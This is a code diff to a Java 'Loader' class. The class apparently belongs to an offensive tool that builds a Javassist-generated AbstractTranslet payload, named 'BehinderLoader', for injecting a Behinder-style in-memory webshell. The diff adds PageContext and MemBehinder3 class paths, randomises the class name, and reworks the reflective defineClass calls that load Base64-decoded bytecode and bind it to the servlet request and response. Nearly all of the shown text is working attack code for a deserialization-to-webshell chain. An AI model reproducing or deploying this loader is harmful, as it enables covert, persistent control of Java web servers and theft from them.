@@ -10,6 +10,7 @@ import sun.misc.BASE64Decoder;
 
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
+import javax.servlet.jsp.PageContext;
 import java.lang.reflect.Method;
 
 public class Loader {
@@ -18,8 +19,10 @@ public class Loader {
         ClassPool classPool = ClassPool.getDefault();
         classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
         classPool.insertClassPath(new ClassClassPath(RequestInfo.class));
+        classPool.insertClassPath(new ClassClassPath(PageContext.class));
+        classPool.insertClassPath(new ClassClassPath(MemBehinder3.class));
 
-        CtClass ctClass = classPool.makeClass("BehinderLoader");
+        CtClass ctClass = classPool.makeClass("BehinderLoader"+ System.nanoTime());
         ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));
         ctClass.addMethod(CtMethod.make("    public static Object getField(Object obj,String fieldName) throws Exception{\n" +
                 "        java.lang.reflect.Field f0 = null;\n" +
@@ -86,12 +89,16 @@ public class Loader {
         "                                                       byte[] var14 = java.util.Base64.getDecoder().decode(c1);\n" +
                 "                                               java.lang.reflect.Method var15 = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
         "                                                       var15.setAccessible(true);\n" +
-        "                                                       Class var16 = (Class)var15.invoke(Class.class.getClassLoader(),new Object[]{ var14, 0, (int)var14.length});\n" +
+                "                                               Class var16 = (Class) var15.invoke(javax.servlet.jsp.PageContext.class.getClassLoader(), new Object[]{var14,new Integer(0), new Integer(var14.length)});\n"+
         "                                                       byte[] var18 = java.util.Base64.getDecoder().decode(c2);\n" +
         "                                                       java.lang.reflect.Method var19 = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
         "                                                       var19.setAccessible(true);\n" +
-        "                                                       Class var20 = (Class)var19.invoke(Class.class.getClassLoader(), var18,new Object[]{ new Integer(0), new Integer(var18.length)});\n" +
-        "                                                       var20.getConstructor(var16).newInstance(var16.getConstructor(ServletRequest.class, ServletResponse.class).newInstance(request, response)).equals(new Object[]{request, response, session, var16.getConstructor(ServletRequest.class, ServletResponse.class).newInstance(request, response)});\n" +
+        "                                                       Class var20 = (Class)var19.invoke(javax.servlet.jsp.PageContext.class.getClassLoader(), new Object[]{var18, new Integer(0), new Integer(var18.length)});\n" +
+        "                                                      // var20.newInstance();\n"+
+                "                                               //java.lang.reflect.Field f = var20.getClass().getDeclaredField(\"pageContext\");\n" +
+                "                                               //f.setAccessible(true);\n" +
+                "                                               //f.set(var20,var16.getConstructor(javax.servlet.ServletRequest.class, javax.servlet.ServletResponse.class).newInstance(request.getRequest(), request.getResponse().getResponse()));"+
+        "                                                       var20.getConstructor(var16.getClass()).newInstance(var16.getConstructor(javax.servlet.ServletRequest.class, javax.servlet.ServletResponse.class).newInstance(request.getRequest(), request.getResponse().getResponse()));\n" +
         "                                                   } catch (Exception var21) {\n" +
         "                                                       var21.printStackTrace();\n" +
         "                                                   }\n" +
